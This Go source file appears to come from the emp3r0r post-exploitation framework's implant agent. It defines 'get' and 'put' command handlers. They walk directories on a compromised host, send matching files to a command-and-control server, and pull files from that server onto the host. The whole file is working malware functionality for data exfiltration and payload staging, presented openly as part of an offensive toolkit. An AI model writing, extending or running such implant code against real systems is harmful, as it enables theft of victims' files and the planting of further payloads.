package agent

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// getCmdRun downloads a file or lists directory files for download.
func getCmdRun(cmd *cobra.Command, args []string) {
	filePath, _ := cmd.Flags().GetString("file_path")
	filter, _ := cmd.Flags().GetString("filter")
	offset, _ := cmd.Flags().GetInt64("offset")
	token, _ := cmd.Flags().GetString("token")

	if filePath == "" || offset < 0 || token == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	// If directory, walk and list files.
	if util.IsDirExist(filePath) {
		var re *regexp.Regexp
		var err error
		if filter != "" {
			re, err = regexp.Compile(filter)
			if err != nil {
				SendCmdRespToC2(fmt.Sprintf("Invalid regex: %v", err), cmd, args)
				return
			}
		}
		fileList := []string{}
		err = filepath.Walk(filePath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() {
				if re != nil && !re.MatchString(info.Name()) {
					return nil
				}
				fileList = append(fileList, path)
			}
			return nil
		})
		if err != nil || len(fileList) == 0 {
			SendCmdRespToC2(fmt.Sprintf("Error: %v", err), cmd, args)
			return
		}
		SendCmdRespToC2(strings.Join(fileList, "\n"), cmd, args)
		return
	}

	// Single file: send file via existing helper.
	err := sendFile2CC(filePath, offset, token)
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("Error: failed to send file %s: %v", filePath, err), cmd, args)
		return
	}
	SendCmdRespToC2(fmt.Sprintf("Success: %s has been sent", filePath), cmd, args)
}

// putCmdRun receives a file from CC and saves it locally.
func putCmdRun(cmd *cobra.Command, args []string) {
	fileName, _ := cmd.Flags().GetString("file")
	destPath, _ := cmd.Flags().GetString("path")
	size, _ := cmd.Flags().GetInt64("size")
	origChecksum, _ := cmd.Flags().GetString("checksum")
	downloadAddr, _ := cmd.Flags().GetString("addr")

	if fileName == "" || destPath == "" || size == 0 {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	_, err := SmartDownload(downloadAddr, fileName, destPath, origChecksum)
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("put: failed to download %s: %v", fileName, err), cmd, args)
		return
	}
	checksum := tun.SHA256SumFile(destPath)
	downloadedSize := util.FileSize(destPath)
	resp := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, checksum)
	if downloadedSize < size {
		resp = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nRun `put` again to resume", downloadedSize, size, checksum)
	}
	SendCmdRespToC2(resp, cmd, args)
}
